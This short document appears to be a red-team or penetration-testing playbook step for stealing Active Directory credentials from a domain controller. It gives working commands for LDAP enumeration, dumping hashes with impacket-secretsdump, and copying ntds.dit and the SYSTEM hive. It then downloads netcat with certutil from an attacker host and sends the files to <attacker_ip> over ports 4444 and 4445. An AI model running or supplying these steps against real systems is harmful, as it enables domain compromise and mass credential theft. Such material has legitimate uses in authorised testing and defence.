# Phase 6: Credential Access (via LDAP, SAM/NTDS)
- Once a DC is identified (e.g., 172.20.2.X), you can:
	- 88, 389
- Enumerate via LDAP (LOLBAS):
```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```
If admin rights are obtained, dump credentials:
1. Use secretsdump from Impacket
```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```
2. If on host with NTDS.dit access:
	Copy ntds.dit and SYSTEM hive for offline cracking
```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```
Transfer those over SMB/certutil:
```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```
Then parse locally:
```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```
